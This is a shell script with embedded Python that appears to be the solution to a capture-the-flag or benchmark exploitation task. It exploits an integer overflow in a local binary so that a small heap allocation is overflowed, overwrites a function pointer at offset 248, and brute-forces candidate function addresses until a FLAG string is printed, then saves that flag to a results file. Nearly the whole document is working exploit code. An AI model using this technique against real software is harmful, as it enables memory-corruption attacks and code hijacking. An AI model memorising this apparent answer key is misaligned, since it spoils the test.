#!/bin/bash

BINARY="/app/vulnerable"
RESULT="/app/results.txt"

python3 <<'PYEOF'
import sys, struct, subprocess, re

BINARY = '/app/vulnerable'

# Integer overflow exploit:
# count = 0x01000001 makes count * 256u wrap to 256 (32-bit unsigned),
# so malloc(256) returns a 256-byte allocation.
# fread writes into items[0].buffer (248 bytes), overflowing into
# items[0].handler at offset 248, replacing the function pointer.
count = 16777217

def try_handler(addr):
    """Run the exploit with the given handler address; return stdout text."""
    payload = b'A' * 248 + struct.pack('<Q', addr)
    data = str(count).encode() + payload
    proc = None
    try:
        proc = subprocess.Popen(
            [BINARY],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, _ = proc.communicate(data, timeout=5)
        return stdout.decode('utf-8', errors='replace')
    except Exception:
        if proc is not None:
            try:
                proc.kill()
            except Exception:
                pass
        return ''

def get_text_range():
    """Return (start, end) of .text section via objdump -h."""
    try:
        out = subprocess.check_output(['objdump', '-h', BINARY]).decode()
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 7 and parts[1] == '.text':
                vma = int(parts[3], 16)
                return vma, vma + int(parts[2], 16)
    except Exception:
        pass
    return None, None

# Collect candidate function entry addresses (architecture-independent).
candidates = []

# Primary: .eh_frame FDE entries list every function's start PC.
# Works on both x86_64 and AArch64, even on stripped binaries.
try:
    out = subprocess.check_output(
        ['readelf', '--debug-dump=frames', BINARY],
        stderr=subprocess.DEVNULL
    ).decode()
    for m in re.finditer(r'FDE cie=\S+ pc=([0-9a-f]+)\.\.([0-9a-f]+)', out):
        candidates.append(int(m.group(1), 16))
except Exception:
    pass

# Fallback: every 4-byte-aligned address in .text.
if not candidates:
    start, end = get_text_range()
    if start is not None:
        candidates = list(range(start, end, 4))

if not candidates:
    print('ERROR: No candidate addresses found', file=sys.stderr)
    sys.exit(1)

# Try each candidate function entry; secret_handler prints FLAG{...}.
for addr in candidates:
    output = try_handler(addr)
    m = re.search(r'FLAG\{[^}]+\}', output)
    if m:
        flag = m.group(0)
        with open('/app/results.txt', 'w') as f:
            f.write(flag + '\n')
        sys.exit(0)

print('ERROR: Flag not found in output', file=sys.stderr)
sys.exit(1)
PYEOF
